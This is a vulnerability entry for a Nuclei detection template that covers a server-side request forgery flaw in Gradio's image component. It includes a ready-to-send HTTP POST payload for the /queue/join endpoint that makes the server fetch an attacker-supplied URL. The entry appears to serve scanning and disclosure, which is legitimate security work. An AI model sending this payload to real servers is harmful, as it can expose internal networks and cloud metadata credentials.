# Nuclei Template: Gradio Image Component - Server-Side Request Forgery
**Template ID:** gradio-image-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`gradio-image-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio image component allows an attacker to exploit SSRF using the path value in the `/queue/join` endpoint, obtained from the user and expected to be a URL, is used to make an HTTP request without sufficient validation checks. This flaw allows an attacker to send crafted requests that could lead to unauthorized access to the local network or the AWS metadata endpoint, thereby compromising the security of internal servers.

## Steps to reproduce / Exploit Payload
```http
POST /queue/join? HTTP/1.1
Host: {{Hostname}}
content-type: application/json

{"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}
```

## References
- https://huntr.com/bounties/e9baeed8-868a-4c1b-882c-715ae0f3072f
